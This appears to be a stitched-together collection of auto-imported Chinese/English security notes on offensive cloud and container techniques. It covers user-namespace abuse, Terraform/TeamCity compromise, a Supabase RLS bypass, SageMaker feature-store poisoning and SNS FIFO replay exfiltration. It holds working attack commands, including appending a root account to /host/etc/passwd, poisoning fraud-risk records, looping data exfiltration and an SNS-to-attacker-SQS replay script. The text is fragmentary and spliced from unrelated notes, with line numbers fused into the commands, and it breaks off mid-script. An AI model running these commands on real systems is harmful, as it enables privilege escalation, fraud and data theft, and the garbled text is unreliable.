usually needs to disable setgroups(2) first: The most practical abuse pattern is to confirm the mapping and then immediately test whether host-mounted content is writable with host-relevant privileges: A safer confirmation on a live assessment is to write a benign marker instead of modifying critical files: This is not by itself a host escape. The reason it matters is that user namespaces can re-enable privileged namespace-local actions that later combine with weak mounts, vulnerable kernels, or badly exposed runtime surfaces. If root maps to an unprivileged host range, that is a much safer baseline and usually indicates real user namespace isolation. If the workload runs as UID 0 and the mapping shows that this corresponds closely to host root, you should interpret the rest of the 容器's privileges much more strictly. # 命令 / 载荷 / 操作片段 # 1. Lab 1234unshare --user --map-root-user --fork bashidcat /proc/self/uid_mapcat /proc/self/gid_map # 2. Lab 1docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map' # 3. Lab 12cat /proc/<pid>/uid_mapcat /proc/<pid>/gid_map # 4. Advanced Mapping Details 12cat /proc/self/setgroupsecho deny > /proc/self/setgroups # 5. Abuse 12345idcat /proc/self/uid_mapcat /proc/self/gid_maptouch /host/tmp/userns_test 2>/dev/null && echo "host write works"ls -ln /host/tmp/userns_test 2>/dev/null # 6. Abuse 12echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"cat /host/etc/passwd | tail # 7. Abuse 12echo test > /host/root/userns_marker 2>/dev/nullls -l /host/root/userns_marker 2>/dev/null # 8. Full Example: Regaining Namespace-Local Capabilities 123unshare -UrmCpf bashgrep CapEff /proc/self/statusmount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works" # 9. Checks 12345readlink /proc/self/ns/user # User namespace identifierid # Current UID/GID as seen inside the containercat /proc/self/uid_map # UID translation to parent namespacecat /proc/self/gid_map # GID translation to parent namespacecat /proc/self/setgroups 2>/dev/null # GID-mapping restrictions for unprivileged writers # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Terraform Lab RCE in Terraform: config file poisoning Terraform plan Terraform Apply Secrets Dumps Abusing Terraform State Files Deleting resources <a href="#deleting-resources" id="deleting-resources"></a> Replace blacklisted provider Terraform Cloud speculative plan RCE and credential exfiltration Compromising Terraform Cloud Using a 令牌 Escaping to the cloud Automatic Audit 工具 Snyk Infrastructure as Code (IaC) Checkov <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a> # 核心要点 Write: You define resources, which may be across multiple cloud providers and services. For example, you might create a configuration to deploy an application on virtual machines in a Virtual Private Cloud (VPC) network with security groups and a load balancer. Here you have a guide and here you have the best way to 下载 terraform. Terraform doesn't have a platform exposing a web page or a network service we can enumerate, therefore, the only way to compromise terraform is to be able to add/modify terraform configuration files or to be able to modify the terraform state file (see chapter below). However, terraform is a very sensitive component to compromise because it will have privileged access to different locations so it can work properly. The main way for an attacker to be able to compromise the system where terraform is running is to compromise the repository that stores terraform configurations, because at some point they are going to be interpreted. It stores users, permissions, projects, build configurations, VCS roots, tokens, artifacts metadata, build history, and integrations. The default HTTP port is 8111. VCS roots and connections: GitHub, GitLab, Bitbucket, Azure DevOps, Perforce, Subversion, and other repository integrations. These often hold PATs, refreshable tokens, SSH keys, or OAuth-backed tokens. Build parameters: values available to configurations and builds. env.* parameters become environment variables, system.* parameters become system properties, and 密码 parameters are masked but still usable by build code. TeamCity itself documents that users who can change code executed by builds can do what the build-agent OS user can do, access resources on the agent, retrieve settings of configurations where their builds run, and potentially affect other projects sharing the same agent. System Administrator: full server control. Assume server OS compromise is possible because admins can change server settings, 上传 plugins, and access diagnostics. Project Viewer / Guest: read-only access may still expose build logs, artifacts, project names, branch names, internal hostnames, and dependency paths. Commit metadata that identifies privileged developers or service users. 上传 a malicious plugin for direct RCE on the TeamCity server, not just an agent. Establish 持久化 through a plugin that looks like an internal integration. 密码 parameters are masked in UI/logs but any code that legitimately receives them can exfiltrate or transform them. TeamCity security notes warn that users who can modify build code can retrieve 密码 values used by that build. Change agentRequirements to run on a more privileged agent. Add VCS triggers for 持久化. 密码 parameters or deployment 凭据 available to PR builds. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/云与容器/Supabase Security 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Supabase Security 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Supabase Security 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Supabase Security 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Supabase Security、Basic Information、Subdomain、Database configuration、API Configuration；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Supabase Security Basic Information Subdomain Database configuration API Configuration anon api keys secret / service role api keys JWT Secret 认证 Signups Auth: Server-side signup enforcement RLS and Views: Write 绕过 via PostgREST OpenAPI-driven CRUD probing from anon/auth roles Passwords & sessions SMTP Settings Advanced Settings Storage Edge Functions # 核心要点 This database will be deployed in some AWS region, and in order to connect to it it would be possible to do so connecting to: postgres://postgres.jnanozjdybtpqgcwhdiz:[YOUR - 密码]@aws-0-us-west-1.pooler.supabase.com:5432/postgres (this was crated in us-west-1).\ The 密码 is a 密码 the user put previously. Therefore, as the subdomain is a known one and it's used as username and the AWS regions are limited, it might be possible to try to brute force the 密码. Reset the database 密码 <summary>Login (/auth/v1 / 令牌？grant type = 密码)</summary> A secret API key will also be generated with role: "service role". This API key should be secret because it will be able to 绕过 Row Level Security. Disable email / 密码 signups in the Dashboard: 认证 → Providers → Email → Disable sign ups (invite-only), or set the equivalent GoTrue setting. Ordinary views execute with the privileges of the view owner by default (definer semantics). In PG ≥15 you can opt into security invoker. Row Level Security (RLS) applies on base tables. Table owners 绕过 RLS unless FORCE ROW LEVEL SECURITY is set on the table. Updatable views can accept INSERT/UPDATE/DELETE that are then applied to the base table. Without WITH CHECK OPTION, writes that don’t match the view predicate may still succeed. PostgREST allows DML on the updatable view and the operation is evaluated with the view owner’s privileges, effectively bypassing the intended RLS policies on the base table. Result: low-privileged clients can mass-edit rows (e.g., profile bios/avatars) they should not be able to modify. Prefer exposing base tables with explicit, least-privilege grants and precise RLS policies. Enforce ALTER VIEW <v> SET (security invoker = on) so the invoker’s privileges are used instead of the owner’s. # 命令 / 载荷 / 操作片段 # 1. anon api keys 12345678910111213141516171819202122POST /auth/v1/signup HTTP/2Host: id.io.netContent-Length: 90X-Client-Info: supabase-js-web/2.39.2Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"Sec-Ch-Ua-Mobile: ?0Authorization: Bearer [REDACTED_SECRET]User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36Content-Type: application/json;charset=UTF-8Apikey: [REDACTED_SECRET]Sec-Ch-Ua-Platform: "macOS"Accept: */*Origin: https://cloud.io.netSec-Fetch-Site: same-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://cloud.io.net/Accept-Encoding: gzip, deflate, brAccept-Language: en-GB,en-US;q=0.9,en;q=0.8Priority: u=1, i{"email":"test@exmaple.com","password":"SomeCOmplexPwd239."} # 2. anon api keys 12345678910111213141516171819202122POST /auth/v1/token?grant_type=password HTTP/2Host: hypzbtgspjkludjcnjxl.supabase.coContent-Length: 80X-Client-Info: supabase-js-web/2.39.2Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"Sec-Ch-Ua-Mobile: ?0Authorization: Bearer [REDACTED_SECRET]User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36Content-Type: application/json;charset=UTF-8Apikey: [REDACTED_SECRET]Sec-Ch-Ua-Platform: "macOS"Accept: */*Origin: https://cloud.io.netSec-Fetch-Site: same-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://cloud.io.net/Accept-Encoding: gzip, deflate, brAccept-Language: en-GB,en-US;q=0.9,en;q=0.8Priority: u=1, i{"email":"test@exmaple.com","password":"SomeCOmplexPwd239."} # 3. It contains the code that executes in response to events. Events are triggers that invoke your serverless functions. They define how and when a function should be executed. Common event types include HTTP requests, scheduled events (cron jobs), database events, file uploads, and more. They are specified under the resources section, often using CloudFormation syntax for AWS. The Provider object specifies the cloud service provider (e.g., AWS, Azure, Google Cloud) and contains configuration settings relevant to that provider. It includes details like the runtime, region, stage, and 凭据. IAM Roles and Permissions define the security 凭据 and access rights for your functions and other resources. They are managed under the provider or individual function settings to specify necessary permissions. Principle of Least Privilege: Assign only necessary permissions to each function. Secrets Manager Integration: Use services like AWS Secrets Manager. Dependency Management: Regularly update dependencies and scan for vulnerabilities. Code Reviews: Conduct thorough reviews to identify security flaws. Static Analysis: Use 工具 to detect vulnerabilities in the codebase. Centralized Logging: Aggregate logs using services like AWS CloudWatch or Datadog. Secure API Communication: Enforce encryption protocols and validate certificates. # 命令 / 载荷 / 操作片段 # 1. Combined with sagemaker:GetRecord, an attacker can read sensitive features. This does not require access to models or endpoints. Complexity: LOW：Simple AWS CLI commands, no model manipulation required Read the current legitimate record Verify the injection: Impact: Attacker creates a fake identity with low risk score (0.01) that can perform high-value fraudulent transactions without triggering fraud 检测. Read multiple records to extract confidential features and profile model behavior: Impact: Confidential features (risk scores, transaction patterns, personal data) exposed to attacker. # 命令 / 载荷 / 操作片段 # 1. 侦察 12345REGION=${REGION:-us-east-1}aws sagemaker list-feature-groups \ --region $REGION \ --query "FeatureGroupSummaries[?OnlineStoreConfig!=null].[FeatureGroupName,CreationTime]" \ --output table # 2. 侦察 1234FG=<feature-group-name>aws sagemaker describe-feature-group \ --region $REGION \ --feature-group-name "$FG" # 3. Attack Scenario 1: Data Poisoning (Overwrite Existing Records) 1234aws sagemaker-featurestore-runtime get-record \ --region $REGION \ --feature-group-name "$FG" \ --record-identifier-value-as-string user-001 # 4. Attack Scenario 1: Data Poisoning (Overwrite Existing Records) 1234567891011121314NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)# Example: Change risk_score from 0.15 to 0.99 to block a legitimate useraws sagemaker-featurestore-runtime put-record \ --region $REGION \ --feature-group-name "$FG" \ --record "[ {\"FeatureName\": \"entity_id\", \"ValueAsString\": \"user-001\"}, {\"FeatureName\": \"event_time\", \"ValueAsString\": \"$NOW\"}, {\"FeatureName\": \"risk_score\", \"ValueAsString\": \"0.99\"}, {\"FeatureName\": \"transaction_amount\", \"ValueAsString\": \"125.50\"}, {\"FeatureName\": \"account_status\", \"ValueAsString\": \"POISONED\"} ]" \ --target-stores OnlineStore # 5. Attack Scenario 2: Malicious Data Injection (Create Fraudulent Records) 1234aws sagemaker-featurestore-runtime get-record \ --region $REGION \ --feature-group-name "$FG" \ --record-identifier-value-as-string user-999 # 7. Attack Scenario 3: Sensitive Data Exfiltration 12345678# Exfiltrate data for known usersfor USER_ID in user-001 user-002 user-003 user-999; do echo "Exfiltrating data for ${USER_ID}:" aws sagemaker-featurestore-runtime get-record \ --region $REGION \ --feature-group-name "$FG" \ --record-identifier-value-as-string ${USER_ID}done # 8. title: SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription 技术笔记
content: 来源路径： 02-知识点/云与容器/SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription、Preconditions、Minimum IAM permissions、Attack: Replay archived messages to attacker SQS FIFO、Impact；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SNS FIFO Archive Replay Exfiltration via Attacker SQS FIFO Subscription Preconditions Minimum IAM permissions Attack: Replay archived messages to attacker SQS FIFO Impact # 核心要点 Abuse of Amazon SNS FIFO topic message archiving to replay and exfiltrate previously published messages to an attacker-controlled SQS FIFO queue by setting the subscription ReplayPolicy. Requirements: Topic must have ArchivePolicy enabled (message archiving). Attacker can Subscribe to the topic and set attributes on their subscription. Attacker controls an SQS FIFO queue and allows the topic to send messages. Impact: Historical messages (published before the subscription) can be delivered to the attacker endpoint. Replayed deliveries are flagged with Replayed=true in the SNS envelope. Attacker has permissions to: Attacker has an SQS FIFO queue and can attach a queue policy allowing sns:SendMessage from the topic ARN. The attacker subscribes their SQS FIFO queue to the victim SNS FIFO topic, then sets the ReplayPolicy to a timestamp in the past (within the archive retention window). SNS immediately replays matching archived messages to the new subscription and marks them with Replayed=true. # 命令 / 载荷 / 操作片段 # 1. Attack: Replay archived messages to attacker SQS FIFO 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061REGION=us-east-1# Compute a starting point; adjust later to >= BeginningArchiveTime if neededTS_START=$(python3 - << 'PY'from datetime import datetime, timezone, timedeltaprint((datetime.now(timezone.utc) - timedelta(minutes=15)).strftime('%Y-%m-%dT%H:%M:%SZ'))PY)# 1) Create SNS FIFO topic with archiving (2-day retention)TOPIC_NAME=htreplay$(date +%s).fifoTOPIC_ARN=$(aws sns create-topic --region "$REGION" \ --cli-input-json '{"Name":"'"$TOPIC_NAME"'","Attributes":{"FifoTopic":"true","ContentBasedDeduplication":"true","ArchivePolicy":"{\"MessageRetentionPeriod\":\"2\"}"}}' \ --query TopicArn --output text)echo "Topic: $TOPIC_ARN"# 2) Publish a few messages BEFORE subscribing (FIFO requires MessageGroupId)for i in $(seq 1 3); do aws sns publish --region "$REGION" --topic-arn "$TOPIC_ARN" \ --message "{\"orderId\":$i,\"secret\":\"ssn-123-45-678$i\"}" \ --message-group-id g1 >/dev/nulldone# 3) Create attacker SQS FIFO queue and allow only this topic to sendQ_URL=$(aws sqs create-queue --queue-name ht-replay-exfil-q-$(date +%s).fifo \ --attributes FifoQueue=true --region "$REGION" --query QueueUrl --output text)Q_ARN=$(aws sqs get-queue-attributes --queue-url "$Q_URL" --region "$REGION" \ --attribute-names QueueArn --query Attributes.QueueArn --output text)cat > /tmp/ht-replay-sqs-policy.json <<JSON{"Version":"2012-10-17","Statement":[{"Sid":"AllowSNSSend","Effect":"Allow","Principal":{"Service":"sns.amazonaws.com"},"Action":"sqs:SendMessage","Resource":"$Q_ARN","Condition":{"ArnEquals":{"aws:SourceArn":"$TOPIC_ARN"}}}]}JSON# Use CLI input JSON to avoid quoting issuesaws sqs set-queue-attributes --region "$REGION" --cli-input-json "$(python3 - << 'PY'import json, osprint(json.dumps({ 'QueueUrl': os.environ['Q_URL'], 'Attributes': {'Policy': open('/tmp/ht-replay-sqs-policy.json').read()}}))PY)"# 4) Subscribe the queue to the topicSUB_ARN=$(aws sns subscribe --region "$REGION" --topic-arn "$TOPIC_ARN" \ --protocol sqs --notification-endpoint "$Q_ARN" --query SubscriptionArn --output text)ec
